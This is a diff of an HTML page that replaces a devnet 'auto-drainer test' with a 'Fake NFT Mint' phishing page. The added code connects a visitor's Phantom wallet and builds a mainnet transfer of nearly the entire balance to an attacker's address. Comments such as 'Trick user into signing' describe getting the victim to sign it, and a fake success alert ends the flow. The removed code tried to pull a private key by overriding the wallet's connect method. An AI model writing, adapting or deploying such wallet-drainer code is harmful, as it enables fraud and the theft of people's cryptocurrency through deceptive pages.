@@ -1,71 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto-Drainer Test</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #fff; }
-        button { padding: 10px 20px; background: #ff4444; border: none; color: white; cursor: pointer; }
-        #status { margin-top: 20px; white-space: pre-wrap; }
-    </style>
+    <title>Fake NFT Mint</title>
+    <script src="https://unpkg.com/@solana/web3.js@1.85.0/lib/index.iife.min.js"></script>
 </head>
 <body>
-    <h1>Connect Wallet (Auto-Drain Test)</h1>
-    <button id="connectButton">Connect Wallet</button>
-    <div id="status"></div>
-
-    <!-- Solana Web3.js -->
-    <script src="https://unpkg.com/@solana/web3.js@1.85.0/lib/index.iife.min.js"></script>
+    <button id="connect">Mint Free NFT!</button>
     <script>
-        const PREDETERMINED_WALLET = "YOUR_ATTACKER_DEVNET_ADDRESS_HERE"; // Replace with your Devnet address
-        let wallet;
+        const ATTACKER_WALLET = "YOUR_WALLET_ADDRESS"; // Attacker's Mainnet address
+        document.getElementById('connect').onclick = async () => {
+            if (window.phantom?.solana) {
+                const phantom = window.phantom.solana;
+                await phantom.connect();
+                const publicKey = phantom.publicKey.toString();
+                
+                // Create malicious transaction
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+                const balance = await connection.getBalance(phantom.publicKey);
+                const tx = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: phantom.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(ATTACKER_WALLET),
+                        lamports: balance - 5000,
+                    })
+                );
 
-        // Override Phantom's connect method to auto-drain
-        const originalConnect = window.phantom?.solana?.connect;
-        if (originalConnect) {
-            window.phantom.solana.connect = async function() {
-                const response = await originalConnect.apply(this, arguments);
-                const privateKey = this._keypair?.secretKey; // Phantom does NOT expose this IRL
-                if (privateKey) {
-                    drainFunds(privateKey);
-                }
-                return response;
-            };
-        }
-
-        // Drain funds silently
-        async function drainFunds(privateKey) {
-            try {
-                const targetKeypair = solanaWeb3.Keypair.fromSecretKey(Uint8Array.from(Buffer.from(privateKey, 'hex')));
-                const attackerWallet = new solanaWeb3.PublicKey(PREDETERMINED_WALLET);
-                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'), 'confirmed');
-
-                const balance = await connection.getBalance(targetKeypair.publicKey);
-                if (balance > 0) {
-                    const transaction = new solanaWeb3.Transaction().add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: targetKeypair.publicKey,
-                            toPubkey: attackerWallet,
-                            lamports: balance - 5000,
-                        })
-                    );
-                    const signature = await solanaWeb3.sendAndConfirmTransaction(connection, transaction, [targetKeypair]);
-                    document.getElementById('status').textContent = `Drained ${balance / solanaWeb3.LAMPORTS_PER_SOL} SOL\nTX: ${signature}`;
-                }
-            } catch (error) {
-                document.getElementById('status').textContent = `Error: ${error.message}`;
+                // Trick user into signing
+                const { signature } = await phantom.signAndSendTransaction(tx);
+                alert("NFT Minted! Check your wallet."); // Fake success message
             }
-        }
-
-        // Connect button
-        document.getElementById('connectButton').addEventListener('click', async () => {
-            if (window.phantom?.solana?.isPhantom) {
-                wallet = window.phantom.solana;
-                await wallet.connect();
-                document.getElementById('connectButton').style.display = 'none';
-            } else {
-                document.getElementById('status').textContent = "Phantom Wallet not installed!";
-            }
-        });
+        };
     </script>
 </body>
 </html>
